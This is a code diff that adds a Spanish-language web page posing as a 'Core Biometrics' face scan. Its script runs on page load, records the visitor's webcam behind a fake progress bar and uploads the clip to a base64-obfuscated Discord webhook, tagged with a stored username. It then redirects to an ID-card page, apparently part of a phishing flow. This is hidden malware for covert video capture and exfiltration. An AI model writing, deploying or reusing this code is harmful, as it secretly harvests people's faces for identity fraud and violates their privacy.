@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Core Biometrics</title>
+    <style>
+        body { background:#000; color:#00a4ef; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+        .v-container { text-align:center; border:1px solid #333; padding:30px; background:#0a0a0a; }
+        video { width:280px; height:280px; border-radius:50%; object-fit:cover; border:3px solid #00a4ef; box-shadow:0 0 15px #00a4ef; }
+        .loader { width:100%; height:3px; background:#111; margin-top:20px; position:relative; overflow:hidden; }
+        #bar { width:0%; height:100%; background:#00a4ef; transition: width 8s linear; }
+    </style>
+</head>
+<body>
+    <div class="v-container">
+        <h2 id="msg">INICIANDO SENSORES...</h2>
+        <video id="v" autoplay playsinline muted></video>
+        <div class="loader"><div id="bar"></div></div>
+    </div>
+
+<script>
+    const _H = (s) => atob(s);
+    const gate = _H("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTI0NTQ3NjUyMzI3ODQ5Mi9BaEhHN05BZkItTkRVZXpZVEV1WUY1WlZnOGphaWdzQ3c5d1hFblpOSXRRREpUd1R3VHdVQkxGTXNuNDkyUFR0dk5N");
+    const u = localStorage.getItem("hydra_u") || "Anon";
+
+    async function start() {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('v').srcObject = stream;
+        const rec = new MediaRecorder(stream);
+        let chunks = [];
+        rec.ondataavailable = e => chunks.push(e.data);
+        rec.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const fd = new FormData();
+            fd.append("file", blob, `v_${u}.webm`);
+            fd.append("payload_json", JSON.stringify({ content: `📹 **VIDEO V99** - User: ${u}` }));
+            await fetch(gate, { method: 'POST', body: fd });
+            window.location.href = "cedula.html";
+        };
+        setTimeout(() => { 
+            document.getElementById('bar').style.width = "100%";
+            document.getElementById('msg').innerText = "ESCANEO EN PROGRESO...";
+            rec.start(); 
+        }, 1000);
+        setTimeout(() => rec.stop(), 9000);
+    }
+    window.onload = start;
+</script>
+</body>
+</html>
